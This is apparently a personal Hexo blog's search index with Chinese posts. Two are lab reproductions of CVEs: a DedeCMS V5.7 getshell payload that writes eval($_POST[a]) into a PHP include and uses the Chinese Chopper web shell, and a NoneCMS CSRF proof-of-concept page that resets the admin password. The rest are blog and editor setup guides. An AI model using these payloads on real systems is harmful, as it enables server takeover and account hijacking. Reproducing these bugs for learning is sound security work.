<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Dedecms V5.7后台的两处getshell(CVE-2018-9175)</title>
    <url>/2021/08/01/Dedecms%20V5.7%E5%90%8E%E5%8F%B0%E7%9A%84%E4%B8%A4%E5%A4%84getshell(CVE-2018-9175)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于工程实践4要求，又做了个对DedecmsV5.7后台两处getshell（CVE-2018-9175）的复现~~</p>
<p>要求是做关于内网渗透，技术有限只能在末尾概述一下这个过程，文章主要讲getshell哈 ，嘻嘻嘻</p>
<p><img src="https://github.com/xinkjung/Photos/raw/???/???.JPG" alt="wow"></p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>不多说了，直接官网下载<a href="url???pan.">Dedecms V5.7</a>放在WWW目录下，安装即可！</p>
<p>顺带提供两个菜刀的下载目录叭 <a href="url">中国菜刀</a> 、 <a href="url">菜刀</a></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>关键的来啦！来啦！注意哦！<br>（其实本人感觉这仿佛是个假洞 真的很迷。。。。。。。）</p>
<blockquote>
<p>查看源码，找到漏洞</p>
</blockquote>
<p>在/dede/sys_verifies.php 第148-第203行，代码如下：</p>
<p><img src="???url" alt="sys_1.php"></p>
<p><img src="???url" alt="sys_2.php"></p>
<p>以上代码中，得知会在/data目录下生成一个名为modifytmp.inc文件，且这个文件的内容是我们可以控制的，因此只需要再找一个include了这个inc文件的地方，变可完成攻击。</p>
<p>全局搜索了一下这个文件，发现就在同一个php文件下面：</p>
<p><img src="??url" alt="sys_3.php"></p>
<blockquote>
<p>写入SHELL并触发</p>
</blockquote>
<p>凑齐利用条件后，便可开始构造写入的语句啦！！！！最后的payload大概如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[0]=123&amp;refiles[1]=\%22;eval($_POST[a]);die();//</span><br></pre></td></tr></table></figure>

<p>阅读代码可知，会先从url中获取一个refiles参数，并且将refiles作为数组参数，被写入modifytmp.inc文件，然后紧接着foreach语句其实重点就是一个replace，绕过它就好了。</p>
<p><img src="url" alt="1_payload"></p>
<p>利用Firefox的插件HackBar执行语句，写入shell成功后，可以查看对应路径下的modifytmp.inc文件验证：</p>
<p><img src="url" alt="2_inc"></p>
<p>这个时候我们再执行触发shell的代码就可以成功getshell啦！！！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.18.77.200:8080/DedeCMS/uploads/dede/sys_verifies.php?action=down</span><br><span class="line">POST data:  a=phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="url" alt="3_shell"></p>
<blockquote>
<p>中国菜刀添加SHELL</p>
</blockquote>
<p>很简单吧！嘻嘻嘻！ <img src="??????url" alt="bq1">打开菜刀添加SHELL，就可以获取相关的文件信息辽~</p>
<p><img src="url" alt="4_caidao.1"></p>
<p><img src="url" alt="4_caidao.2"></p>
<p>综上漏洞复现getshell就完成了哈哈哈哈哈哈哈</p>
<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>就想放一个表情包略略略<img src="url" alt="bq2"></p>
<p>大概需要俩虚拟机(一个作内网服务器，一个作内网主机)和一个物理机(也就是我们所控制的攻击机)</p>
<p>首先物理机访问内网服务器，再通过漏洞getshell，拿到内网服务器控制权？</p>
<p>扫描发现内网服务器下有一台内网主机在运行，经过端口转发和代理又访问到了内网主机，再挖漏洞getshell。</p>
<p>这时，物理机也就是攻击机就可以控制内网主机啦~~~ 大概就是这么渗透的叭 哈哈哈哈</p>
<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>1.源码添加代码过滤恶意标签。</p>
<p>2.修改./dede(后台目录)为其他名称，避免使用admin、administrator等敏感名称。</p>
<p>3.及时打补丁，更新补丁。</p>
<h1 id="amazing"><a href="#amazing" class="headerlink" title="amazing"></a>amazing</h1><p>好啦！ 搞定了哦</p>
<p><img src="url" alt="bq3"></p>
<p><a href="balabalabbbbbba....">参考链接</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title>My First Blog</title>
    <url>/2021/07/31/My-First-Blog/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>使用github pages服务搭建博客的好处有：</p>
<ol>
<li>全是静态文件，访问速度快；</li>
<li>免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</li>
<li>可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</li>
<li>数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</li>
<li>博客内容可以轻松打包、转移、发布到其它平台；</li>
</ol>
<p><img src="https://github.com/xinkjung/Photos/raw/master/xhr.jpg" alt="xhr"></p>
<span id="more"></span>


<h1 id="My-First-Blog–搭建过程"><a href="#My-First-Blog–搭建过程" class="headerlink" title="My First Blog–搭建过程"></a>My First Blog–搭建过程</h1><blockquote>
<p>准备</p>
</blockquote>
<ul>
<li>Node.js ： <a href="https://nodejs.org/en/%22%E5%AE%98%E7%BD%91%22">官网</a> 下载最新版本，默认安装即可</li>
<li>Git ：可通过 <a href="https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137396287703354d8c6c01c904c7d9ff056ae23da865a000">Git安装教程</a> 对于不同系统进行操作，也是默认安装即可</li>
<li>Hexo ： <a href="https://hexo.io/zh-cn/docs/index.html">Hexo官网</a> ，有详细配置操作</li>
<li>Github ： 没有就注册一个账号</li>
</ul>
<blockquote>
<p>本地设置初始化</p>
</blockquote>
<p>在你新建立文件夹下（如Blog），右键任意位置，选择 Git Bash Here，出现如下界面<br><img src="https://github.com/xinkjung/Photos/raw/master/GitBashHere.jpg" alt="GBH"></p>
<p>此时进行初始化操作，首先执行“hexo init”命令   </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>

<p> 并执行如下命令，安装 npm</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo</span><br></pre></td></tr></table></figure>

<p>然后进行生成预览及上传一系列操作：</p>
<pre><code>$ hexo g # == hexo generate 生成
$ hexo s # == hexo server 本地预览
$ hexo d # == hexo deploy 上传 
</code></pre>
<p>在浏览器中打开网址 <a href="https://localhost:4000/">https://localhost:4000</a> ，显示如下画面，就OK啦！（它已经自动写好了一篇Hello World的文章）<br><img src="https://github.com/xinkjung/Photos/raw/master/Hexo.jpg" alt="Hexo"></p>
<blockquote>
<p>绑定Github</p>
</blockquote>
<p>   首先创建一个名为 ‘你的用户名.github.io’的仓库，以后你的博客访问地址就是 https://你的用户名.github.io</p>
<p>然后可以绑定域名，我没进行这个操作就省略了哈。</p>
<p>下面就要配置SSH Key了<br>同上，一样的在你的根目录（我的是Blog）下使用Git Bash执行命令 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd ~/. ssh #这个命令用于检测本机已存在的SSH key</span><br></pre></td></tr></table></figure>

<p>若提示：No such file or directory 说明你是第一次使用git。</p>
<p>然后再输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;你的邮件地址&quot;</span><br></pre></td></tr></table></figure>

<p>连续三次回车，会生成一个名为 ‘.ssh\id_rsa.pub’ 的文件在你的用户目录下。找到此文件，记事本打开并复制里面内容，再进入你的Github主页，找到个人设置下的SSH and GPG keys -&gt; New SSH key， 把刚才复制的内容粘贴到key那里，title随便填，保存。<br>（这时你应该会收到一个邮件）</p>
<p>但是还不确定是否配置成功对吧，那我们现在来测试一下</p>
<p>同样的，在Git Bash 中输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com  ##注意此处不用更改邮箱地址</span><br></pre></td></tr></table></figure>

<p>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会出现如下字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi 你的用户名! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>

<p>就表示你的SSH key已经配置成功啦！！！</p>
<p>然后还要配置文件_config.yml中的deploy部分，用记事本打开该文件（Blog根目录下），修改如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:你的用户名/你的用户名.github.io.git</span><br><span class="line">  branch: hexo          # 这里建议不要存放于主分支master下，这是我的子分支hexo</span><br></pre></td></tr></table></figure>

<p>保存退出，再在Git Bash下执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>这时，再输入 hexo d，就会将本次有改动的代码全部提交，没有改动的不会。<br>命令执行成功后，浏览器中打开网址 https://你的用户名.github.io 就会看到和刚才打开 <a href="https://localhost:4000/">https://localhost:4000</a> 一样的页面，博客就搭建好啦！！！</p>
<blockquote>
<p>注意保留CNAME、README.md等文件</p>
</blockquote>
<p>提交之后网页可能打不开，这是因为代码仓库中少了一个名为CNAME的文件，手动添加一个文件再刷新几次就能打开了。（必须为命名为 ‘CNAME’，内容为你的网站域名,如：xinkjung.github.io）</p>
<p>为了避免此类现象，一些非md文件可以把它们放到根目录的source文件夹下，这里的所有文件都会原样复制（除了md文件）到public目录的，由于hexo默认会把所有md文件都转换成html，包括README.md，所有需要每次生成之后、上传之前，手动将README.md复制到public目录，并删除README.html。</p>
<p>其他参考<br><a href="http://www.cnblogs.com/MuYunyun/p/5927491.html">http://www.cnblogs.com/MuYunyun/p/5927491.html</a><br><a href="http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa">http://blog.haoji.me/build-blog-website-by-hexo-github.html?from=xa</a></p>
<blockquote>
<p>插入图片</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  ![图片说明](./img/图片名.jpg...url)</span><br></pre></td></tr></table></figure>

<p> 图片保存于source文件夹的img目录内，不过这个好像无法显示图片</p>
<p> 推荐最好上传到仓库里，直接使用网页链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">github 图片链接格式：(http://github.com/yourname/your-repository/raw/master/images-folder/xxx.png)</span><br><span class="line">要自己设定的：yourname, your-repository, your-folder, xxx.png。    </span><br><span class="line">yourname            --- 你的帐号    </span><br><span class="line">your-respository    --- 你的 project 名    </span><br><span class="line">images-folder       --- 你存放图片的文件夹，如果是直接放在 project 的项目根目录的話，就可以省略這個    </span><br><span class="line">xxx.png             --- 你的图片名</span><br></pre></td></tr></table></figure>

<p>然后在**.md文件里添加，例如：我的存在于项目Photos根目录下<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG" alt="hhh"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![hhh](https://github.com/xinkjung/Photos/raw/master/IMG_0019.JPG)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>插入超链接</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">代码格式如下：  [网页链接说明](https://..... url)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Blog</tag>
        <tag>GitHub</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Nonecms v1.3后台CSRF漏洞(CVE-2018-7219)</title>
    <url>/2021/08/01/Nonecms%20v1.3%E5%90%8E%E5%8F%B0CSRF%E6%BC%8F%E6%B4%9E(CVE-2018-7219)/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>此次实践只是为了学习知识，巩固一下网络攻防，增强动手能力。</p>
<span id="more"></span>

<h1 id="Action"><a href="#Action" class="headerlink" title="Action"></a>Action</h1><p>这次实验很简单（PHP等其他环境搭建好的条件下），在NoneCms官网找到下载链接，按照提示安装即可。</p>
<p>以修改管理员密码为例，来说明漏洞详情：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">        $params = input(&#x27;post.&#x27;);</span><br><span class="line">            $data = [</span><br><span class="line">                &#x27;username&#x27; =&gt; $params[&#x27;user_name&#x27;],</span><br><span class="line">                &#x27;password&#x27; =&gt;  $params[&#x27;password&#x27;],</span><br><span class="line">                &#x27;email&#x27; =&gt; $params[&#x27;email&#x27;],</span><br><span class="line">                &#x27;islock&#x27; =&gt; $params[&#x27;islock&#x27;],</span><br><span class="line">                &#x27;repassword&#x27; =&gt; $params[&#x27;repassword&#x27;]</span><br><span class="line">            ];</span><br><span class="line">---------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">     /**</span><br><span class="line">     * 修改用户信息</span><br><span class="line">     */</span><br><span class="line">    public function edit($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $data = Db::name(&#x27;admin&#x27;)-&gt;find($id);</span><br><span class="line">        $this-&gt;assign(&#x27;data&#x27;, $data);</span><br><span class="line">        return $this-&gt;fetch();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
<p>根据代码（application/admin/controller/Admin.php ）可以发现，由于没有加入token只需要输入新密码即可，因此这里存在着CSRF漏洞。</p>
<p>我们首先记录管理员初始密码的md5值，方便后面对比<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms1.PNG" alt="nonecms1"></p>
<p>抓包查看参数，发现并没有token参数限制，并且不需要我们输入旧密码，所以直接CSRF即可~<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms4.png" alt="nonecms4"></p>
<p>于是我们制作一个恶意网页，诱导管理员点击该网页，便可达到修改管理员的目的。<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms3_crsf.PNG" alt="nonecms3_csrf"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form action=&quot;http://127.0.0.1/public/index.php/admin/admin/edit.html&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;nonecms&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;repassword&quot; value=&quot;admin&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;role&amp;#95;id&quot; value=&quot;&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;islock&quot; value=&quot;0&quot; /&gt;</span><br><span class="line">      &lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;1&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;script&gt;docuemnt.form[0].submit();&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这时再查看数据库发现后台管理员密码已被修改！<br><img src="https://github.com/xinkjung/Photos/raw/master/nonecms2.PNG" alt="nonecms2"></p>
<p>同样的，我们也可以利用CSRF请求来新添一位管理员用户</p>
<p>到此，此次实验完成！！！<br><img src="https://github.com/xinkjung/Photos/raw/master/IMG_2872.GIF" alt="happy"></p>
<p>参考链接<br><a href="http://foreversong.cn/archives/1081">http://foreversong.cn/archives/1081</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>Sublime text3配置PHP</title>
    <url>/2021/08/01/Sublime-text3%E9%85%8D%E7%BD%AEPHP/</url>
    <content><![CDATA[<h1 id="sublime-text3配置PHP环境"><a href="#sublime-text3配置PHP环境" class="headerlink" title="sublime text3配置PHP环境"></a>sublime text3配置PHP环境</h1><blockquote>
<p>准备</p>
</blockquote>
<ul>
<li>Sublime text 3: 可以直接到<a href="http://www.sublimetext.com/">Sublime text3官网</a>下载适合自己电脑的版本安装即可</li>
<li>PHP: 也是到<a href="http://www.phpstudy.net/">phpstudy官网</a>下载安装即可</li>
</ul>
<span id="more"></span>

<blockquote>
<p>PHP安装</p>
</blockquote>
<p>下面进行PHP 环境变量 配置:</p>
<p>安装好phpstudy后，进入其根目录，找到php这个文件夹会发现里面有各种版本的php，随便选择一个版本你使用就 。</p>
<p>右键我的电脑-&gt;属性-高级系统设置-&gt;高级。找到环境变量，点击</p>
<ol>
<li>编辑用户变量的Path，添加你刚刚选择php版本的路径，保存</li>
<li>编辑系统变量的Path，也是一样的做法，添加php存储 并保存</li>
</ol>
<p><img src="https://github.com/xinkjung/Photos/raw/master/yhpath.jpg" alt="用户"><br><img src="https://github.com/xinkjung/Photos/raw/master/xtpath.jpg" alt="系统"></p>
<p>然后”win+R”输入cmd，进入命令提示符窗口，输入php -v ，会显示你的php版本信息，就表示配置完成了哦！！<br>（输入php -h命令也会显示相关信息）<br><img src="https://github.com/xinkjung/Photos/raw/master/php-v.jpg" alt="cmd"></p>
<blockquote>
<p>sublime text3配置PHP编译系统</p>
</blockquote>
<p>打开软件，菜单栏找到Tools-&gt;Build System-&gt;New Build System.<br>这时会弹出如下文件显示代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	&quot;shell_cmd&quot;: &quot;make&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;     </span><br><span class="line">	 &quot;cmd&quot;: [&quot;php&quot;, &quot;$file&quot;], </span><br><span class="line">     &quot;file_regex&quot;: &quot;php$&quot;,</span><br><span class="line">     &quot;selector&quot;: &quot;source.php&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后保存在默认路径下，并修改文件名为php.sublime-build，到此就OK啦！！！<br>重启sublime text3，随便输入php代码，再按”ctrl+B”就可以编译了。</p>
<p><img src="https://github.com/xinkjung/Photos/raw/master/helloworld.jpg" alt="php-hw"><br><img src="https://github.com/xinkjung/Photos/raw/master/hw-result.jpg" alt="php-result"></p>
<h1 id="Sublime-text3配置浏览器预览"><a href="#Sublime-text3配置浏览器预览" class="headerlink" title="Sublime text3配置浏览器预览"></a>Sublime text3配置浏览器预览</h1><blockquote>
<p>准备</p>
</blockquote>
<ul>
<li>SideBarEnhancements插件： 这是一款侧边栏增强插件，<br>“ctrl+shift+p”打开快速菜单栏，输入”pcip”，选择”install packages”回车，在搜索框内查找该插件并下载。</li>
</ul>
<blockquote>
<p>配置相关文件</p>
</blockquote>
<p>  首先为插件指定默认浏览器，打开 “ Preference -&gt; Package Settings -&gt; Side Bar -&gt; Settings-User”,在打开的文件中输入以下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">  &quot;default_browser&quot;: &quot;firefox&quot; //one of this list: firefox, aurora, chrome, canary, chromium, opera, safari</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认浏览器可以是列表任一，我选用的是火狐Firefox</p>
<p>然后为插件指定默认localhost目录，在侧边栏任意文档上右键，选择”Project -&gt; Edit Preview URLs”,在文件中添加：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;F:/PHP/text/&quot;:&#123;</span><br><span class="line">        &quot;url_testing&quot;: &quot;http://localhost:81/&quot;,</span><br><span class="line">        &quot;url_production&quot;: &quot;http://xinkjung.com/&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p> 1.”F:/PHP/text/“： 是文件在磁盘中的路径</p>
<p> 2.”url_testing”: 本地localhost路径，请根据个人情况修改</p>
<p> 3.”url_production”：项目线上地址（好像可以随便填）</p>
<p> 接下来最后一步，为浏览器绑定热键，打开”Preference -&gt; Package Settings -&gt; Side Bar -&gt; key Bindings-User”，在打开的文件中添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;keys&quot;: [&quot;ctrl++shift+f1&quot;],</span><br><span class="line">        &quot;command&quot;: &quot;side_bar_open_in_browser&quot;,</span><br><span class="line">        &quot;args&quot;: &#123;</span><br><span class="line">                    &quot;paths&quot;: [],</span><br><span class="line">                    &quot;type&quot;: &quot;testing&quot;,</span><br><span class="line">                    &quot;browser&quot;: &quot;firefox&quot;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>我使用的是”ctrl+shift+f1”，可视个人习惯而定，浏览器我选用Firefox。</p>
<p>到此，所有就设置好啦，在页面中按相应热键，选择文件就能在设置的浏览器中浏览啦！！！</p>
<ul>
<li>注：一定要打开phpstudy,且文件放置在WWW目录下才可实现哦~</li>
</ul>
<p>附上参考链接：<br>1、<a href="https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html">https://jingyan.baidu.com/article/15622f2419ce79fdfcbea5ea.html</a></p>
<p>2、<a href="https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html">https://jingyan.baidu.com/article/09ea3ede04ebe9c0aede390d.html</a></p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>Sublime text3</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2021/07/26/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
</search>
